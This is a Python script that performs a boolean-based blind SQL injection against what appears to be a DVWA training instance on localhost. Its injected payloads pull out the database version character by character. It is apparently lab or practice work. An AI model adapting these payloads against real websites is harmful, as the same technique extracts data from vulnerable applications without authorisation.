import requests

URL = "http://localhost:8000/vulnerabilities/sqli_blind/"
COOKIES = {
    "PHPSESSID": "eqpdijdfcckjif62i98u15ce15",
    "security": "low"
}

TRUE_STRING = "User ID exists"

def is_true(payload):
    params = {
        "id": payload,
        "Submit": "Submit"
    }
    r = requests.get(URL, params=params, cookies=COOKIES)
    return TRUE_STRING in r.text


# Find SQL version length
def get_version_length(max_len=50):
    print("Find Sql version length...")
    for length in range(1, max_len + 1):
        payload = f"1' AND LENGTH(@@version)={length}#"
        if is_true(payload):
            print(f"Sql version length: {length}")
            return length
    return None


# Extract SQL version
def get_sql_version(length):
    print("Extract SQL version")
    version = ""

    for position in range(1, length + 1):
        for ascii_code in range(45, 123):  # -, ., digits, letters
            payload = (
                f"1' AND ASCII(SUBSTRING(@@version,{position},1))={ascii_code}#"
            )
            if is_true(payload):
                version += chr(ascii_code)
                print(f"Char {position}: {chr(ascii_code)}")
                break

    return version


if __name__ == "__main__":
    length = get_version_length()
    if length:
        version = get_sql_version(length)
        print(f"\n Sql version: {version}")
